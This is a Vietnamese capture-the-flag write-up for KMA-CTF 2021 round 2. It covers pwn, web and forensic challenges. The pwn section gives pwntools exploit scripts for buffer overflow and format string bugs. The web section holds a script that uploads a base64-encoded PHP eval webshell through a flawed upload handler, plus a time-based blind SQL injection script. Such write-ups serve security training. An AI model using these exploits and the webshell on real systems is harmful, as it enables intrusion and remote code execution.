---
layout: post
title: WRITE-UP KMA-CTF-2021 LAN 2
image: kma-ctf-2021/second/background.png
date: 2021-08-30 14:00:00 +0700
tags: [ctf, kma, kcsc]
categories: ctf
---



| Challenge type                                             | 
| ------------------------------------------------------------ | 
| [WEB](#WEB) | 
| [PWNABLE](#PWNABLE) | 
| [REVERSE](#REVERSE) | |
| [CRYPTOGRAPHY](#CRYPTOGRAPHY) | 
| [FORENSIC](#FORENSIC) |



# <a name="PWNABLE">PWN üå±

Credit write-up: [Th√†nh Draw](https://github.com/n0bit4lsm3)

### KMA

ƒê·ªëi v·ªõi c√°c b√†i th·ª≠ th√°ch v·ªÅ Pwn, ƒë·∫ßu ti√™n ch√∫ng ta s·∫Ω ki·ªÉm tra c√°c ki·∫øn tr√∫c v√† c∆° ch·∫ø b·∫£o v·ªá c·ªßa n√≥ nh∆∞:

- Architecture: Intel x86, Intel x64, ARM, ...
- [RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/): c∆° ch·∫ø n√†y cho ph√©p m·ªôt s·ªë section ch·ªâ ƒë∆∞·ª£c read (kh√¥ng c√≥ quy·ªÅn write, execute).
- [Stack](https://ctf101.org/binary-exploitation/stack-canaries/): c∆° ch·∫ø n√†y ki·ªÉm tra xem stack c√≥ b·ªã overwrite kh√¥ng.
- [NX](https://ctf101.org/binary-exploitation/no-execute/): c∆° ch·∫ø ngƒÉn ch·∫∑n input ho·∫∑c data th·ª±c thi.
- [PIE](https://ir0nstone.gitbook.io/notes/types/stack/pie): c∆° ch·∫ø gi√∫p file load v√†o c√°c v√πng nh·ªõ kh√°c nhau, l√†m cho ƒë·ªãa ch·ªâ kh√¥ng c·ªë ƒë·ªãnh.

ƒê·ªÉ ki·ªÉm tra, t√¥i s·∫Ω s·ª≠ d·ª•ng `checksec` tool.

[![h1](https://user-images.githubusercontent.com/38103453/131296774-967822f3-3e4d-4afe-ba34-72bc051116ca.PNG)](https://user-images.githubusercontent.com/38103453/131296774-967822f3-3e4d-4afe-ba34-72bc051116ca.PNG)

V√¨ ƒë√¢y l√† m·ªôt challenge ƒë∆°n gi·∫£n, c√°c c∆° ch·∫ø b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c disable ƒë·ªÉ d·ªÖ d√†ng trong vi·ªác exploit.

Load v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.

[![h2](https://user-images.githubusercontent.com/38103453/131296777-4e9bc669-013f-4665-ab7d-b313623327c0.PNG)](https://user-images.githubusercontent.com/38103453/131296777-4e9bc669-013f-4665-ab7d-b313623327c0.PNG)

Lu·ªìng ch∆∞∆°ng tr√¨nh:

- Kh·ªüi t·∫°o 0x20 bytes tr√™n stack ƒë·ªÉ l∆∞u input.
- Cho ph√©p ng∆∞·ªùi d√πng nh·∫≠p l√™n ƒë·∫øn 0x100 bytes.
- Gi·∫£i ph√≥ng 0x20 bytes tr√™n stack v√† l·ªánh `pop edx` s·∫Ω l·∫•y gi√° tr·ªã ƒë·ªÉ so s√°nh. N·∫øu `edx` b·∫±ng v·ªõi chu·ªói `_KMA` th√¨ s·∫Ω ƒë∆∞·ª£c v√†o shell.

T·ª´ ƒë√¢y, t√¥i c√≥ th·ªÉ k·∫øt lu·∫≠n ƒë√¢y l√† Buffer Overflow.

ƒê·ªÉ exploit ta ch·ªâ c·∫ßn nh·∫≠p ƒë·ªß 0x20 bytes, theo sau l√† chu·ªói `_KMA`.

[![h3](https://user-images.githubusercontent.com/38103453/131296781-7cbbde95-97a4-4fda-b28a-615337ffa607.PNG)](https://user-images.githubusercontent.com/38103453/131296781-7cbbde95-97a4-4fda-b28a-615337ffa607.PNG)

### Amazingg

Ki·ªÉm tra c√°c c∆° ch·∫ø b·∫£o v·ªá c·ªßa file.

[![h4](https://user-images.githubusercontent.com/38103453/131296782-3bce8f04-2345-4475-a08a-5ca5c28fe6e3.PNG)](https://user-images.githubusercontent.com/38103453/131296782-3bce8f04-2345-4475-a08a-5ca5c28fe6e3.PNG)

Ch√∫ √Ω, ta th·∫•y ƒë√¢y l√† m·ªôt file 64 bit. Load file v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.

[![h5](https://user-images.githubusercontent.com/38103453/131296785-e9f56028-5441-42fc-a641-70b57777ac4b.PNG)](https://user-images.githubusercontent.com/38103453/131296785-e9f56028-5441-42fc-a641-70b57777ac4b.PNG)

T·∫°i h√†m `gets()` cho ph√©p nh·∫≠p v·ªõi ƒë·ªô d√†i t√πy √Ω, n√™n t√¥i x√°c ƒë·ªãnh ƒë√¢y l√† Buffer Overflow.

[![h6](https://user-images.githubusercontent.com/38103453/131296786-4f1d229d-1c54-450e-8b56-f022bd93d132.PNG)](https://user-images.githubusercontent.com/38103453/131296786-4f1d229d-1c54-450e-8b56-f022bd93d132.PNG)

Nh√¨n v√†o c√°c function c·ªßa ch∆∞∆°ng tr√¨nh, t√¥i th·∫•y th√™m c√°c h√†m `Func1()`, `Func2()`, `Func3()`, `Puts_flag()`.

H√†m `Puts_flag()` s·∫Ω ki·ªÉm tra c√°c bi·∫øn `check1`, `check2`, `check3` do c√°c h√†m `Func1()`, `Func2()`, `Func3()` g√°n. Do v·∫≠y, ta ph·∫£i l·ª£i d·ª•ng l·ªó h·ªïng Buffer Overflow ƒë·ªÉ th·ª±c thi ƒë∆∞·ª£c t·∫•t c·∫£ c√°c h√†m n√†y m·ªõi c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c flag.

ƒê·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu n√†y, ta ph·∫£i t√≠nh to√°n offset h·ª£p l√Ω ƒë·ªÉ t·∫°o payload.

- ƒê·∫ßu ti√™n, trong h√†m `main()` c√≥ l·ªánh `sub rsp, 10h` v√† `leave` n√™n ta s·∫Ω nh·∫≠p ƒë·ªß 0x10 bytes. (V√¨ sao th√¨ c√°c b·∫°n xem √Ω nghƒ©a c·ªßa l·ªánh leave).
- Ti·∫øp theo, c√°c h√†m `Func1()`, `Func2()`, `Func3()` ƒë·ªÅu c√≥ l·ªánh `cmp [rbp-4], 539h`. N√™n ta s·∫Ω nh·∫≠p 4 bytes t√πy √Ω v√† 0x539 ƒë·ªÉ ghi ƒë√® v√†o `rbp`.
- Cu·ªëi c√πng, `return address` t√¥i s·∫Ω nh·∫≠p v√†o c√°c h√†m c·∫ßn th·ª±c thi.

ƒê√¢y l√† script exploit.

```
from pwn import *

p = process("./amazingg")
p.recvuntil("step....\n")
p.sendline(b"a"*16 + b"a"*4 + p32(1337) + p64(0x4006E6) + p64(0x40070E) + p64(0x400736) + p64(0x40075E))
p.interactive()
```

### fs

Ki·ªÉm tra c√°c c∆° ch·∫ø b·∫£o v·ªá c·ªßa file.

[![h7](https://user-images.githubusercontent.com/38103453/131296791-006dadfc-4229-4d35-8932-15005ca7fb33.PNG)](https://user-images.githubusercontent.com/38103453/131296791-006dadfc-4229-4d35-8932-15005ca7fb33.PNG)

Challenge n√†y ƒë√£ b·∫≠t c∆° ch·∫ø Stack Canary, n√™n s·∫Ω kh√¥ng c√≥ l·ªó h·ªïng Buffer Overflow n·ªØa.

Load file v√†o IDA ƒë·ªÉ ph√¢n t√≠ch.

[![h8](https://user-images.githubusercontent.com/38103453/131296793-83f4495e-f1ac-44b8-93c3-c2b30e850e42.PNG)](https://user-images.githubusercontent.com/38103453/131296793-83f4495e-f1ac-44b8-93c3-c2b30e850e42.PNG)

Trong h√†m `vuln()`, t√¥i th·∫•y c√≥ l·ªánh `printf(s);` n√™n t√¥i x√°c ƒë·ªãnh ƒë√¢y l√† l·ªï h·ªïng Format String.

ƒê·ªÉ khai th√°c l·ªói n√†y, ta ph·∫£i t√¨m ƒë∆∞·ª£c offset, t·ª´ `esp` ƒë·∫øn v√πng nh·ªõ flag ƒë∆∞·ª£c l∆∞u tr·ªØ ·ªü stack.

[![h9](https://user-images.githubusercontent.com/38103453/131296794-66db61f0-8978-4eb7-bea5-0589cafe24fa.PNG)](https://user-images.githubusercontent.com/38103453/131296794-66db61f0-8978-4eb7-bea5-0589cafe24fa.PNG)

B·∫≠t debug, t√¥i t√¨m ƒë∆∞·ª£c offset b·∫Øt ƒë·∫ßu c·ªßa flag s·∫Ω l√† `57`. ƒê·ªÉ l·∫•y ƒë∆∞·ª£c gi√° tr·ªã t·∫°i offset n√†y, t√¥i d√πng format `$p`.

Vi·∫øt Script khai th√°c.

```
from pwn import *

offset = 57
flag = ""

while True:
	p = process("./fs")

	p.recvuntil("\n")

	payload = "%" + str(offset) + "$p"
	p.sendline(payload)

	recv = p.recvuntil("\n").decode("utf-8")
	recv = recv[11:len(recv) - 1]
	if offset == 57:
		recv = recv[:len(recv) - 2]
	flag += bytes.fromhex(recv).decode('utf-8')[::-1]
	offset += 1

	print(flag)
```

---

# <a name="WEB">WEB üç¶

Credit write-up: [nhienit2010](https://github.com/nhienit2010)

### ekyc

ƒê·∫ßu ti√™n, ta d√πng `git-dumper` ƒë·ªÉ k√©o to√†n b·ªô folder `.git` tr√™n server v·ªÅ v√† l·∫•y source.
Source code:

```
<?php
ini_set("display_errors", 1);
// ini_set("display_startup_errors", 1);
error_reporting(E_ALL);

$DB_HOST = '192.168.0.3';
$DB_PORT = 27017;
$DB_NAME = 'apikey_db';

function get_client_ip()
{
  $ipaddress = '';
  if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
  else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_X_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
  else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
  else if (isset($_SERVER['REMOTE_ADDR']))
    $ipaddress = $_SERVER['REMOTE_ADDR'];
  else
    $ipaddress = 'UNKNOWN';
  return $ipaddress;
}
//check db
try {
  //Connect DB
  $key = "";
  $limit = "";
  $current = "";
  //Get Key - Value from DB && Check API-key form request
  $header = getallheaders();
  if (isset($header['Api-Key'])) {
    $query = [[
      'key' => 'key',
      'limit' => 10,
      'current' => 0
    ]];
    if ($query) {
      $key = $query[0]['key'];
      $limit = $query[0]['limit'];
      $current = $query[0]['current'];
      $key_send = $header['Api-Key'];
      // var_dump($key_send);
      if ($key_send == $key) {
        if ($limit >= $current) {
          $current++;
          $data_log = $_REQUEST;
          $data_send = $_POST;
          $data_log['IP'] = get_client_ip();
          $data_log['requestTime'] = new \DateTime();

          try {
            //Add to memcached
            $memcached = new Memcached();
            $memcached->addServer('127.0.0.1', 11211);
            $memcached->add("file_base64_AIconnector", $data_send['base64'], 36000);
            //Add to Redis
            $redis = new Redis();
            $redis->connect('192.168.16.164', 6798);
            $redis->auth('apikey_cloud');
            $redis->set('key_AIconnector', $key);
            $redis->set('limit_AIconnector', $limit);
            $redis->set('current_AIconnector', $current);
          } catch (\Throwable $e) {
          }

          $base64_string = $_POST["base64"];
          // echo $base64_string;
          //Check have extension in base64 string or not
          if (strpos($base64_string, ',')) {
            // Chia base64 v√† data IMEI
            $check_imei = explode(',', $base64_string);
            $base64 = $check_imei[1];
            $imei = $check_imei[0];
            //L·∫•y EMEI
            $imei = substr($imei, 5, -7);  // bcd
            var_dump($imei);
            var_dump($base64);
            $extension_file = explode('/', $imei);
            //Write to new file
            $output_file = __DIR__ . "/upload/img_" . time() . "." . $extension_file[1];
            var_dump($output_file);

            $file = fopen($output_file, "wb");
            fwrite($file, base64_decode($base64));
            fclose($file);
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $finfo = finfo_file($finfo, $output_file);
            $cFile = curl_file_create($output_file, $finfo, basename($output_file));

            $data_send_final = array("image" => $cFile, "filename" => $output_file, "mime" => $finfo, "postname" => basename($output_file));
            //After write log, send data to 3rd party
            var_dump($data_send_final);
            $curl = curl_init();
            $data_string = json_encode($data_send_final);
            curl_setopt_array($curl, array(
              CURLOPT_URL => "https://api.fpt.ai/vision/idr/vnm",
              CURLOPT_CUSTOMREQUEST => "POST",
              CURLOPT_POSTFIELDS => $data_send_final,
              CURLOPT_HTTPHEADER => array(
                "api-key: " . $key
              ),
              CURLOPT_RETURNTRANSFER => true,
            ));
            $response = curl_exec($curl);
            $err = curl_error($curl);
            curl_close($curl);
            if ($err) {
              echo "cURL Error #:" . $err;
            } else {
              header('Content-Type: application/json');
              echo $response;
            }
          } else {
            //Write to new file
            $output_file = __DIR__ . "/upload/img_" . time() . ".jpg";
            $file = fopen($output_file, "wb");
            fwrite($file, base64_decode($base64_string));
            fclose($file);

            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $finfo = finfo_file($finfo, $output_file);
            $cFile = curl_file_create($output_file, $finfo, basename($output_file));

            $data_send_final = array("image" => $cFile, "filename" => $output_file, "mime" => $finfo, "postname" => basename($output_file));
            //After write log, send data to 3rd party
            $curl = curl_init();
            $data_string = json_encode($data_send_final);

            curl_setopt_array($curl, array(
              CURLOPT_URL => "https://api.fpt.ai/vision/idr/vnm",
              CURLOPT_CUSTOMREQUEST => "POST",
              CURLOPT_POSTFIELDS => $data_send_final,
              CURLOPT_HTTPHEADER => array(
                "api-key: " . $key
              ),
              CURLOPT_RETURNTRANSFER => true,
            ));
            $response = curl_exec($curl);
            $err = curl_error($curl);
            curl_close($curl);
            if ($err) {
              echo "cURL Error #:" . $err;
            } else {
              header('Content-Type: application/json');
              echo $response;
            }
          }
        } else {
          $return = array("errorCode" =>  "11", "errorMessage" => "Reach Request Limit", "data" => $_REQUEST);
          header('Content-Type: application/json');
          echo json_encode($return);
        }
      }
    } else {
      $return = array("errorCode" =>  "1", "errorMessage" => "The key isn't correct", "data" => $_REQUEST);
      header('Content-Type: application/json');
      echo json_encode($return);
    }
  } else {
    $return = array("errorCode" =>  "403", "errorMessage" => "Permission Denied!");
    header('Content-Type: application/json');
    echo json_encode($return);
  }
  exit(0);
} catch (Exception $ex) {
  http_response_code(505);
  die();
}
```

Nh√¨n c√≥ v·∫ª kh√° ph·ª©c t·∫°p nh∆∞ng ta ch·ªâ ch√∫ √Ω ƒë·∫øn ƒëo·∫°n n√†y

```
$base64_string = $_POST["base64"];
          // echo $base64_string;
          //Check have extension in base64 string or not
          if (strpos($base64_string, ',')) {
            // Chia base64 v√† data IMEI
            $check_imei = explode(',', $base64_string);
            $base64 = $check_imei[1];
            $imei = $check_imei[0];
            //L·∫•y EMEI
            $imei = substr($imei, 5, -7);  // bcd
            $extension_file = explode('/', $imei);
            //Write to new file
            $output_file = __DIR__ . "/upload/img_" . time() . "." . $extension_file[1];
            $file = fopen($output_file, "wb");
            fwrite($file, base64_decode($base64));
            fclose($file)
```

·ªû ƒë√¢y ta th·∫•y c√≥ th·ªÉ control ƒë∆∞·ª£c extension v√† n·ªôi dung c·ªßa file upload n√™n √Ω t∆∞·ªüng l√† d√πng ch·ª©c nƒÉng n√†y ƒë·ªÉ t·∫°o m·ªôt php webshell. V√† `$_POST["base64"]` l√† m·ªôt string ƒë∆∞·ª£c chia l√†m 2 ph·∫ßn t√°ch b·ªüi d·∫•u `,`, ph·∫ßn b√™n ph·∫£i l√† chu·ªói base64 sau khi decode ra th√¨ s·∫Ω l√† n·ªôi dung c·ªßa file, v√† ph·∫ßn b√™n tr√°i ƒë∆∞·ª£c check ƒë·ªÉ l·∫•y `extension`.
`$extension_file` s·∫Ω ƒë∆∞·ª£c l·∫•y t·ª´ `substr($imei, 5, -7)` (v·ªõi `$imei` ph·∫ßn b√™n tr√°i c·ªßa chu·ªói `$_POST["base64"]` t√°ch b·ªüi d·∫•u `,`), nghƒ©a l√† chu·ªói s·∫Ω ƒë∆∞·ª£c c·∫Øt t·ª´ v·ªã tr√≠ `5 k√Ω t·ª± ƒë·∫ßu` v√† v·ªã tr√≠ `7 k√Ω t·ª± t·ª´ k√Ω t·ª± cu·ªëi c√πng tr·ªü ng∆∞·ª£c v·ªÅ ƒë·∫ßu`. V√≠ d·ª•: `substr("ahihi/php1234567", 5, -7) = /php`.
Khi th√†nh c√¥ng th√¨ t√™n file s·∫Ω ƒë∆∞·ª£c l∆∞u v√† c√≥ d·∫°ng `/upload/img_23132123121.php` v·ªõi s·ªë `23132123121` ƒë∆∞·ª£c h√†m `time()` t·∫°o ra. V√† s·ªë do h√†m `time` gen ra ta c√≥ th·ªÉ brute-force ƒë·ªÉ t√¨m ra t√™n file.
ƒê·ªÉ l√†m ƒë∆∞·ª£c nh·ªØng ƒëi·ªÅu ƒë√≥, m·ªôt ƒëi·ªÅu ki·ªán quan tr·ªçng n·ªØa l√† ph·∫£i t·ªìn t·∫°i header `Api-Key` v√† gi√° tr·ªã c·ªßa n√≥ ph·∫£i l√† `key`, d·ª±a v√†o source code nh∆∞ sau:

```
if ($query) {
      $key = $query[0]['key'];
      $limit = $query[0]['limit'];
      $current = $query[0]['current'];
      $key_send = $header['Api-Key'];
      // var_dump($key_send);
      if ($key_send == $key) {
```

Nh∆∞ng khi th·ª≠ th√¨ fail c√≥ v·∫ª nh∆∞ server ch·∫∑n truy c·∫≠p v√†o c√°c file c√≥ d·∫°ng `img_xxxxxxx.php` ch·ªâ to√†n tr·ªè v·ªÅ `img_.php`, v√¨ th·∫ø ta ch·ªâ c·∫ßn th√™m g√¨ ƒë√≥ tr∆∞·ªõc `.php` l√† ƒë∆∞·ª£c v√≠ d·ª• nh∆∞: `img_1233112323.aa.php`

My solution:

```
import requests
import time

url = 'http://ekyc.ctf.actvn.edu.vn'
r = requests.Session()
headers = {'Api-Key': 'key', 'X-Forwarded-For':'127.0.0.1'}

def exploit():
    s = int(time.time())
    resp = r.post(url, headers=headers, data={'base64':'asdas/aa.phpsasdphp,PD9waHAgCmV2YWwoJF9HRVRbJ2NtZCddKTsKPz4='})

    for i in range(s, s+10):
        u = url + '/upload/img_' + str(i) + '.aa.php'
        resp = r.get(u, headers=headers)
        if resp.status_code != 404:
            print(u)

if __name__ == "__main__":
    exploit()
```

Flag: `KMACTF{Ekyc_Ekyc_Everywhere}`

### SQL injection

C√≥ m·ªôt khung search text cho ta nh·∫≠p v√†o m·ªôt th·ª© g√¨ ƒë√≥ v√† sau ƒë√≥ tr·∫£ v·ªÅ d·ªØ li·ªáu t·ª´ database, khi search th√¨ d·ªØ li·ªáu POST l√™n c√≥ d·∫°ng

```
{
 "s":"anything",
 "f":[
     "id",
     "text",
     "title", 
     "description"]
}
```

Nh∆∞ng c√≥ v·∫ª tr∆∞·ªùng `f` kia ch·ª©a `column` s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o c√¢u query, nghƒ©a l√† ta c√≥ th·ªÉ control ƒë∆∞·ª£c t√™n c·ªôt. M√¨nh ƒë√£ th·ª≠ thay `description` th√†nh `sleep(3)` th√¨ response tr·∫£ v·ªÅ sau 3s, n√™n ƒë√¢y l√† ch·ªï m√† ta c√≥ th·ªÉ inject.
Query ƒë·ªÉ l·∫•y t√™n b·∫£ng:

```
{
 "s":"anything",
 "f":[
     "id",
     "text",
     "title", 
     "(select case when (select table_name from information_schema.tables limit 1 offset 1) like '_fl%' then sleep(1) else 1 end)-- -"]
}  
```

Sau m·ªôt l√∫c ta nh·∫≠n c√≥ ƒë∆∞·ª£c b·∫£ng `_flag_` v√† c√≥ m·ªôt column l√† `flag`, nh∆∞ng d·ª±a v√†o hint t·ª´ author l√† flag c√≥ ch·ª©a k√Ω t·ª± `utf8mb4`, nghƒ©a l√† flag kh√¥ng ch·ª©a c√°c k√Ω t·ª± `alphabet` nh∆∞ b√¨nh th∆∞·ªùng, √Ω t∆∞·ªüng l√† encode n√≥ sang hex v√† d√πng regex ƒë·ªÉ l·∫•y c√°c k√Ω t·ª± hex ƒë√≥ ra v√¨ hex ch·ªâ ch·ª©a c√°c k√Ω t·ª± t·ª´ [0->f]

My solution:

```
import requests
from string import printable
import time

url = 'http://bif.ctf.actvn.edu.vn'
r = requests.Session()
flag = ''
while True:
	for c in printable.replace('%','').replace('*',''):
		payload = f"(select case when (select hex(flag) from _flag_ limit 1 offset 0) RLIKE \"^{flag + c}.*\" then sleep(1) else 1 end)-- -"
		data = {"s":"anything","f":["1","2","3", payload]}
		s = time.time()
		resp = r.post(url, json=data, headers={'Content-type': 'application/json'})
		e = time.time()

		if (e - s >= 2):
			flag += c
			print(flag)
			break
```

Flag: `KMACTF{üê±üêàüêà‚Äç‚¨õüêàüêàüêàüê±}`

----

# <a name="FORENSIC">FORENSIC üåè

### Talk-72

Credit write-up: DangKhai

Challenge link: [link](https://drive.google.com/file/d/1S4s4Z4Kii9CrRaJ8WLXXEMKjOd-qMLYY/view?usp=sharing)

```
Description: I hear them whispering something!
```

G·ª£i √Ω:

S·ª≠ d·ª•ng c√¥ng c·ª• [SSTV Decoder](https://www.qsl.net/on6mu/rxsstv.htm) v·ªõi ch·ª©c nƒÉng `robot 72` th·ª±c hi·ªán gi·∫£i m√£ ƒëo·∫°n wav.

> Flag: KMA{4r3a_51_closer_UFO}



### Old trick ;)

Credit write-up: DangKhai

Challenge link: [link](https://drive.google.com/file/d/113PYny-dTnHWOfObzwxh7MxLPU-AjEVy/view?usp=sharing)

```
Description: Not image.
```

G·ª£i √Ω:

1. Tr√≠ch xu·∫•t m√£ m√†u rgb c·ªßa ·∫£nh ƒë∆∞·ª£c cho. V√≠ d·ª• ·ªü pixel th·ª© nh·∫•t t·ª©c `x,y(0,0)` tr√≠ch xu·∫•t ƒë∆∞·ª£c gi√° tr·ªã `RGB(33, 193, 180)`, sau ƒë√≥ chuy·ªÉn ƒë·ªïi gi√° tr·ªã RGB n√†y th√†nh m√£ hex t∆∞∆°ng ·ª©ng v√≠ d·ª• **21C1B4** . L√†m t∆∞∆°ng t·ª± v·ªõi t·∫•t c·∫£ pixel c·ªßa ·∫£nh.
2. Sau khi chuy·ªÉn ƒë·ªïi th√†nh m√£ hex, x√°c ƒë·ªãnh **signature** c·ªßa t·ªáp ch·ª©a c·ªù. 
3. Th·ª±c hi√™n Re-Compress l·∫°i th√†nh t·ªáp v√† nh·∫≠n c·ªù ch·ª©a b√™n trong.

> Flag: KMA{0ld_tr!ck_but_y0u_c4n_us3_!t}



### Misc - KCSC - HPPD

Credit write-up: DangKhai

G·ª£i √Ω:

#### ·∫¢i 1:

```
                     ------------oOo------------
G·ª≠i  c√°c  anh  ch·ªã  c·ª±u  th√†nh  vi√™n,  c√°c  b·∫°n  trong  CLB,  c√°c  nh·∫´n  gi·∫£.
Nh√¢n  d·ªãp  c√¢u  l·∫°c  b·ªô  KCSC  tr√≤n  2  tu·ªïi,  m·ªôt  c·ªôt  m·ªëc  quan  tr·ªçng  ƒë√°nh  d·∫•u  s·ª±  h√¨nh  th√†nh  v√†  ph√°t  tri·ªÉn  c·ªßa  c√¢u  l·∫°c  b·ªô,  ch√∫ng  m√¨nh  t·ªï  ch·ª©c  m·ªôt  bu·ªïi  l·ªÖ  k·ªâ  ni·ªám  nho  nh·ªè  du·ªõi  h√¨nh  th·ª©c  ONLINE.
V√¨   t√¨nh  h√¨nh   d·ªãch C√¥   Vy  ph·ª©c   t·∫°p,  kh√¥ng c√≥  c√°ch  n√†o  h∆°n ƒë·ªÉ   chia  s·∫ª   ni·ªÅm  vui n√†y   c√πng  c√°c   b·∫°n.   Ho·∫°t  ƒë·ªông ch√≠nh   c·ªßa l·ªÖ  k·ª∑  ni·ªám  n√†y  ch·ªâ l√†  ƒë√¥i  l·ªùi  m√†  KCSC   ch√∫ng m√¨nh   c·∫£m  ∆°n, tri   √¢n  ƒë·∫øn   c√°c b·∫°n  ƒë·ªçc  gi·∫£,   c√°c   th√†nh  vi√™n   trong CLB   ƒë√£  lu√¥n   g·∫Øn   b√≥ v√†   ƒë·ªìng   h√†nh   c√πng   KCSC.   Ngo√†i ra,  t·ª•i  m√¨nh   c√≤n| chu·∫©n  b·ªã  m·ªôt  v√†i  th·ª≠  th√°ch  CTF  nho  nh·ªè  g·ª≠i  ƒë·∫øn  c√°c  b·∫°n  cho  ƒë√∫ng  kh√¥ng  kh√≠  l√†  m·ªôt  c√¢u  l·∫°c  b·ªô  ATTT.
ƒê·ªÉ  kh√¥ng  b·ªè  l·ª°  s·ª±  ki·ªán  ƒë·∫∑c  bi·ªát  n√†y,  ch√∫ng  m√¨nh  xin  k√≠nh  m·ªùi  c√°c  b·∫°n  nhanh  ch√≥ng  truy  c·∫≠p  v√†o  fanpage  CLB  ƒë·ªÉ  c·∫≠p  nh·∫≠t  nh·ªØng  th√¥ng  tin  m·ªõi  nh·∫•t  v·ªÅ  l·ªÖ  k·ªâ  ni·ªám  n√†y  nh√©.
S·ª±  tham  gia  c·ªßa  c√°c  b·∫°n  l√†  ni·ªÅm  vinh  d·ª±  c·ªßa  ch√∫ng  m√¨nh!
Th·∫Øc  m·∫Øc  xin  li√™n  h·ªá  DinDonDon  !
                        ------------oOo------------
```

Kho·∫£ng c√°ch gi·ªØa c√°c t·ª´ trong th∆∞ ·∫©n m√£ [morse](https://vi.wikipedia.org/wiki/M%C3%A3_Morse). V·ªõi 

* `[space] * 3 = - (hyphen) `
* `[space] * 2 = . (dot)`
* `[space] * 1 = (space)`

Sau khi extract ƒë∆∞·ª£c ƒëo·∫°n m√£, s·ª≠ d·ª•ng [morse decoder](https://morsedecoder.com/) gi·∫£i m√£ v√† nh·∫≠n ph·∫ßn ƒë·∫ßu c·ªßa c·ªù.

> KCSC(TH4NK_Y0U

·∫¢i 2:

Link k√≠ t·ª±: [link](https://notepad.pw/kcsc-hpbd-2021)

S·ª≠ d·ª•ng [hex decoder](https://www.convertstring.com/vi/EncodeDecode/HexDecode) decode hex, x√°c ƒë·ªãnh **signature** c·ªßa **rar file**. D√πng password ƒë∆∞·ª£c ƒë√≠nh k√®n sau khi gi·∫£i m√£ th·ª±c hi·ªán gi·∫£i n√©n t·ªáp v√† nh·∫≠n ph·∫ßn ti·∫øp theo c·ªßa c·ªù.

> _F0R_ALL_&

·∫¢i 3:

Osint t√¨m th√¥ng tin v·ªÅ **DinDonDon**.

Truy c·∫≠p v√†o trang [member kcsc](https://kcsc-club.github.io/team-members/#media) t√¨m ki·∫øm th√¥ng tin c√≥ li√™n quan ƒë·∫øn **DinDonDon**, nh·∫≠n ƒë∆∞·ª£c chu·ªói `8wHQ6oZp3LTC6x5pCY`. Gi·∫£i m√£ base58 v√† nh·∫≠n ƒë∆∞·ª£c ph·∫ßn cu·ªëi c·ªßa c·ªù.

> _G00D_H34LTH)

C·ªù ƒë·∫ßy ƒë·ªß:

> Flag: KCSC(TH4NK_Y0U_F0R_ALL_&_G00D_H34LTH)



### Let's take a look at the operating system architecture

Credit write-up: [5L1V3RKN16H7KM4](https://github.com/SilverKnightKMA)

Challenge link:  https://bit.ly/2WCKVLC

```
Description: We got some good files from the victim's computer. I think you know what to do with it. Find it up!

**Questions:**

1. What is the originai name of the file "renamed" Hint length is 6
2. What is the user of the computer in use? Flint length is 8
3. This section is hosted on the Internet
4. What is the name of the final file downloaded by the victim? Hint length is 4

Hint: *Renamed file has more information than you think!
```

> ### Supportive Tools:
>
> - [File](https://en.wikipedia.org/wiki/File_(command))
> - [Registry Explorer/RECmd](https://ericzimmerman.github.io/#!index.md)
> - [DB Browser for SQLite](https://sqlitebrowser.org/dl/)

#### Ph√¢n t√≠ch challenge

Ch√∫ng ta nh·∫≠n ƒë∆∞·ª£c 1 file chall.rar, x·∫£ n√©n ra ta c√≥ m·ªôt folder ***Roaming*** v√† file ***renamed***
[![1.png](https://camo.githubusercontent.com/f8b06b3af09ac4ae7bdc61cd311dd8c720ae8ee9c1e01b872df176e5704916c0/68747470733a2f2f692e696d6775722e636f6d2f4b76464e48394f2e706e67)](https://camo.githubusercontent.com/f8b06b3af09ac4ae7bdc61cd311dd8c720ae8ee9c1e01b872df176e5704916c0/68747470733a2f2f692e696d6775722e636f6d2f4b76464e48394f2e706e67)
Theo nh∆∞ c·∫•u tr√∫c th∆∞ m·ª•c trong ***Roaming***, m√¨nh nh·∫≠n ra ƒë√¢y l√† m·ªôt ph·∫ßn c·ªßa folder [AppData](https://www.howtogeek.com/318177/what-is-the-appdata-folder-in-windows/) tr√™n Windows.
D√πng command [File](https://en.wikipedia.org/wiki/File_(command)), ta c√≥ k·∫øt qu·∫£ ƒë√¢y l√† registry file
[![2.png](https://camo.githubusercontent.com/c3938c97410abb74926338d3b99176d16f77a20298a974e63beeb0b8643889c3/68747470733a2f2f692e696d6775722e636f6d2f6b5555794a73612e706e67)](https://camo.githubusercontent.com/c3938c97410abb74926338d3b99176d16f77a20298a974e63beeb0b8643889c3/68747470733a2f2f692e696d6775722e636f6d2f6b5555794a73612e706e67)

#### Q1

```
What is the originai name of the file "renamed" Hint length is 6
```

Ch√∫ng ta ti·∫øn h√†nh m·ªü file ***renamed*** b·∫±ng [Registry Explorer/RECmd](https://ericzimmerman.github.io/#!index.md)
[![3.png](https://camo.githubusercontent.com/aa3ade59ebe07c1cca9af5ce89e0f7c8553cade9145ffb9546e5afcd40b5ffc7/68747470733a2f2f692e696d6775722e636f6d2f313167613443542e706e67)](https://camo.githubusercontent.com/aa3ade59ebe07c1cca9af5ce89e0f7c8553cade9145ffb9546e5afcd40b5ffc7/68747470733a2f2f692e696d6775722e636f6d2f313167613443542e706e67)
T·ª´ c√°c key ƒë√£ cho, ch√∫ng ta c√≥ th·ªÉ x√°c nh·∫≠n ƒë√¢y l√† hive [*HKEY_CURRENT_USER*](https://www.lifewire.com/hkey-current-user-2625901)
